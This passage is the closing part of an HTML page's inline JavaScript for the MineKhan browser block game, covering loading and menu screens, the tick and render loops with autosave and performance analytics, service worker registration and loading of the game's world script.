			let offsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0
			fill(255)
			textSize(25)
			text("Downloading...", width / 2+offsetX, height / 2 - 65)
			drawLoadBar(width/2+offsetX,height/2+20)
			let prog = downloadingProgress/downloadingTotal
			text(floor(prog*100)+"% "+formatBytes(downloadingProgress)+"/"+formatBytes(downloadingTotal), width/2+offsetX,height/2+30)
			drawProgressBar(width/2,height/2+70,prog)
			ctx.globalAlpha = 1
    }
		drawScreens.loadingResources = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
			ctx.textAlign = 'center'
			let offsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0
			fill(255)
			textSize(25)
			text("Loading resources...", width / 2+offsetX, height / 2 - 65)
			drawLoadBar(width/2+offsetX,height/2+20)
			let prog = downloadingProgress/downloadingTotal
			text(floor(prog*100)+"% "+formatBytes(downloadingProgress)+"/"+formatBytes(downloadingTotal), width/2+offsetX,height/2+30)
			drawProgressBar(width/2,height/2+70, (prog+initTextureProgress)*0.5)
			ctx.globalAlpha = 1
		}
		/*drawScreens["packetViewer raw"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
			ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Packet Viewer: raw", width / 2, lerp(ctx.globalAlpha,-18,2))
			drawPacketViewerRaw()
			if(now - pvLastUpdateSize > 1000){
				let size = pvSize / ((now - pvLastUpdateSize)/1000)
				pvLastUpdateSize = now
				pvSize = 0
				pvTotalSize = formatBytes(size)
			}
			ctx.textAlign = "left"
			ctx.font = "18px thefont"
			text("About "+pvTotalSize+" per second.",140,30)
			ctx.globalAlpha = 1
		}
		drawScreens["packetViewer json"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
			ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Packet Viewer: json", width / 2, lerp(ctx.globalAlpha,-18,2))
			if(now - pvLastUpdateSize > 1000){
				let size = pvSize / ((now - pvLastUpdateSize)/1000)
				pvLastUpdateSize = now
				pvSize = 0
				pvTotalSize = formatBytes(size)
			}
			ctx.textAlign = "left"
			ctx.font = "18px thefont"
			text("About "+pvTotalSize+" per second.",140,30)
			ctx.globalAlpha = 1
		}*/
		drawScreens["seed templates"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
      ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Seed Templates", width / 2, lerp(ctx.globalAlpha,-18,2))
			ctx.globalAlpha = 1
		}
		drawScreens.achievments = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
      ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Achievments", width / 2, lerp(ctx.globalAlpha,-18,2))
			ctx.globalAlpha = 1
		}
		drawScreens["achievments discoveries"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
      ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Discoveries", width / 2, lerp(ctx.globalAlpha,-18,2))
			ctx.globalAlpha = 1
		}
	})()

	let stopTicking
  function tickLoop(){
		if(stopTicking) return//for errors
		let tickStart = now = performance.now()
		if (inWorld && ((screen !== "pause" && screen !== "options" && !screen.startsWith("options ") || !host || serverWorld.players.length>1))) {
      doTick()
			if(host){
				if(autosaveTimer !== null && now - autosaveTimer > 5000){
					autosaveTimer = null
					serverWorld.sendAll({type:"saveProg",data:"save"})
					save().then(() => {
						saving = false
						serverWorld.sendAll({type:"saveProg",data:"end"})
					})
				}else if(worldSettings.autosave && now - lastAutosave > 300000/*5 minute*/){
					lastAutosave = now
					autosaveTimer = now
					saving = true
					serverWorld.sendAll({type:"saveProg",data:"start"})
				}
			}
		}
		analytics.ticks++
		now = performance.now()
		analytics.totalTickTime += now - tickStart
    tick = true
    window.parent.tickid = setTimeout(tickLoop, max(tickTime - (now - tickStart),10))
    lastTick = now
  }
	function renderLoop() {
		if(stopTicking) return//for errors
		let frameStart = now = performance.now()

		if(ctx.imageSmoothingEnabled) ctx.imageSmoothingEnabled = false
    if(allLoaded){
			prevAnimationAmount = animationAmount
			if(changeSceneAnimation !== null){
				hoverbox.classList.add("hidden")
				if(now - changeSceneAnimation > 500){
					changeSceneAnimation = null
					animationAmount = 0
					if (!autoDrawScreens.includes(screen)) {
						drawScreens[screen]()
						Button.draw()
						Slider.draw()
					}
					if(html[previousScreen] && html[previousScreen].exit){
						for(let i of html[previousScreen].exit) if(!html[screen] || !html[screen].enter || !html[screen].enter.includes(i)) i.classList.add('hidden')
					}
					if(html[screen] && html[screen].enter){
						for(let i of html[screen].enter) i.style.transform = "", i.style.opacity = ""
					}
				}else{
					animationAmount = (now - changeSceneAnimation)/500
					animationAmount = 1-((1-animationAmount)**4)
					thisSceneCurrent = false
					drawScreens[previousScreen]()
					Button.draw()
					Slider.draw()
					thisSceneCurrent = true
					if(html[previousScreen] && html[previousScreen].exit){
						let t = `scale(${1-animationAmount})`
						for(let i of html[previousScreen].exit) i.style.transform = t
					}
					if(html[screen] && html[screen].enter){
						let t = `translateX(${(1-animationAmount)*width/4}px)`
						for(let i of html[screen].enter) i.style.transform = t, i.style.opacity = animationAmount
					}
				}
			}
			if(!performFast){
				if((screen === "options") && beforeOptionsScreen === "main menu"){
					if(tick)renderMainBG()
				}
				if(screen === "main menu"){
					if(tick)renderMainBG()
					hoverbox.classList.add("hidden")
					drawScreens[screen]()
					Button.draw()
					Slider.draw()
				}
			}
      
      if (autoDrawScreens.includes(screen) || changeSceneAnimation !== null) {
				hoverbox.classList.add("hidden")
        drawScreens[screen]()
        Button.draw()
        Slider.draw()
      }
    }

    if(tick) tick = false
    updateMusic()

		if (Date.now() - analytics.lastUpdate > 500 && analytics.frames) {
			analytics.displayedTickTime = (analytics.totalTickTime / analytics.ticks).toFixed(1)
			analytics.displayedRenderTime = (analytics.totalRenderTime / analytics.frames).toFixed(1)
			analytics.displayedFrameTime = (analytics.totalFrameTime / analytics.frames).toFixed(1)
			analytics.fps = round(analytics.frames * 1000 / (Date.now() - analytics.lastUpdate))
			analytics.tps = round(analytics.ticks * 1000 / (Date.now() - analytics.lastUpdate))
			analytics.displayedwFrameTime = analytics.worstFrameTime.toFixed(1)
			analytics.frames = 0
			analytics.totalRenderTime = 0
			analytics.totalTickTime = 0
      analytics.ticks = 0
			analytics.totalFrameTime = 0
			if(analytics.worstFrameTime > 50){
				analytics.badFrameTimeCount++
				if(settings.graphics === null && analytics.badFrameTimeCount > 4){
					settings.graphics = "fast"
					updatePerformFast()
					Messages.add("Some things have been disabled because of high frame time. You can change this in settings.")
				}
			}else analytics.badFrameTimeCount = 0
			analytics.worstFrameTime = 0
			analytics.lastUpdate = Date.now()
			updateHUD = true
		}

		analytics.frames++
		analytics.totalFrameTime += performance.now() - frameStart
		analytics.worstFrameTime = max(performance.now() - frameStart, analytics.worstFrameTime)
		win.raf = requestAnimationFrame(renderLoop)
	}
	return function(){
		if(initEverything){
			initEverything().then(() => win.raf = requestAnimationFrame(renderLoop))
			initEverything = null //Only run once
			return
		}else renderLoop()
	}
}

/*let hide = false, timeLeftN
function timeLeft(){
	const SECOND = 1000
	const MINUTE = SECOND * 60
	const HOUR = MINUTE * 60
	const DAY = HOUR * 24
	const d = new Date(), day = d.getDay(), now = d.getHours() * HOUR + d.getMinutes() * MINUTE + d.getSeconds() * SECOND + d.getMilliseconds()
	const time = (day === 5 ? 14 : 15)*HOUR
	if(day > 0 && day < 6 && now >= HOUR*8 && now < time){
		let diff = time - now;
		if (diff < 0) diff += DAY;
		timeLeftN = diff
		return diff
	}
	timeLeftN = 0
}
function timeLoop(){
	const t = timeLeft()
	if(!t || hide){
		document.querySelector("#countdown").parentElement.remove()
		var init = MineKhan()
		return init()
	}
	const SECOND = 1000
	const MINUTE = SECOND * 60
	const HOUR = MINUTE * 60
	document.querySelector("#countdown").innerHTML = `${String(Math.floor(t/HOUR)).padStart(2,"0")}:${String(Math.floor((t%HOUR)/MINUTE)).padStart(2,"0")}:${String(Math.floor((t%MINUTE)/SECOND)).padStart(2,"0")}:${String(t%SECOND).padStart(4,"0")}`
	window.parent.raf = requestAnimationFrame(timeLoop)
}*/

if (window.parent.raf) {
	window.cancelAnimationFrame(window.parent.raf)
	console.log("Canceled", window.parent.raf)
}
//document.querySelector("#hideCountdown").onclick = () => hide = true
//timeLoop()

function lookAt(x,y,z){
  let p = player
  var {atan2, PId, PI2,PI} = Math
  p.ry = atan2(z - p.z, x - p.x) + PI2+PI
  var adjacent = dist2(p.x,p.z,x,z)
  p.rx = atan2(y - p.y, adjacent)
}

if (("serviceWorker" in navigator) && location.origin === "https://thingmaker.us.eu.org") {
  window.addEventListener("load", function() {
    navigator.serviceWorker
      .register("/sw.js")
      .then(res => console.log("service worker registered"))
      .catch(err => console.log("service worker not registered", err))
  })
}

function scrollToEl(id){
  var el = document.getElementById(id)
  if(el) el.scrollIntoView()
}
//INSERT-SERVER-CODE-HERE
if(window.initServerEverything){
	window.init = MineKhan()
	init()
}else{
	let lastSlash = location.href.lastIndexOf("/")
	let lastDot = location.href.indexOf(".",lastSlash)
	if(lastDot === -1) lastDot = location.href.indexOf("?",lastSlash)//remove query which comes after dot
	if(lastDot<0) lastDot = location.href.length
	let filename = location.href.substring(0,lastDot)+"-world.js"
	
	let script = document.createElement("script")
	script.type = "module"
	script.src = filename
	script.onload = () => {
		window.init = MineKhan()
		init()
	}
	document.body.appendChild(script)
}
		</script>
	</body>
</html>

<!--if this is preview version, change preVersion to true-->